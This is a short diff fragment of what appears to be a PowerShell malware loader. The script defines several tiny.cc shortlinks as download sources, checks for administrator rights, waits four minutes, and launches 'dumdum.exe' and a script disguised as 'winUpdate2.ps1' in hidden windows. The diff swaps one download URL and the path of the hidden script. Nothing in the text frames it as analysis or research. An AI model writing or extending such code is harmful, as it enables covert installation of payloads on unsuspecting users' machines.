@@ -19,7 +19,7 @@ Set-Variable -Name zipUrl -Value ("http://tiny.cc/f7cg001")
 Set-Variable -Name zipUrl_1 -Value ("http://tiny.cc/k7cg001")
 Set-Variable -Name zipUrl_2 -Value ("http://tiny.cc/p7cg001")
 Set-Variable -Name zipUrl_3 -Value ("http://tiny.cc/v7cg001")
-Set-Variable -Name Url_1 -Value ("http://tiny.cc/limg001")
+Set-Variable -Name Url_1 -Value ("http://tiny.cc/g1pg001")
 Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
 function Test-IsAdmin {
     Set-Variable -Name currentUser -Value (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()))
@@ -57,7 +57,7 @@ Start-Sleep -Seconds 240
 
 Start-Process -windowstyle hidden -FilePath "$desktopPath\dumdum.exe" 
 
-Start-Process -windowstyle hidden -FilePath "$desktopPath\winUpdate.ps1"
+Start-Process -windowstyle hidden -FilePath "$zipFilePath\winUpdate2.ps1"
 
 exit 0
 
